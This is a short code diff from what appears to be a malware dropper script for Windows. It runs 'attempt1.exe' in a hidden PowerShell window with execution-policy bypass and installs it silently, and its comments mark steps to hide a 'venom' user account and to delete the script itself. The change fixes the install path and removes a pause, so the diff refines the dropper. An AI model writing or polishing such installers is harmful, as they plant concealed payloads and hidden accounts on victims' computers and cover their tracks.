@@ -65,10 +65,9 @@ powershell powershell.exe -windowstyle hidden -ep bypass ./attempt1.exe
 
 .\attempt1.exe; ./calty2
     # Install the attempt1.exe file
-powershell Start-Process -FilePath "$path attempt1.exe" -ArgumentList "/silent" -Wait
+powershell Start-Process -FilePath $path ./attempt1.exe -ArgumentList "/silent" -Wait
 
 # hide venom user
-pause
 
 # self delete
 cd $initial_dir
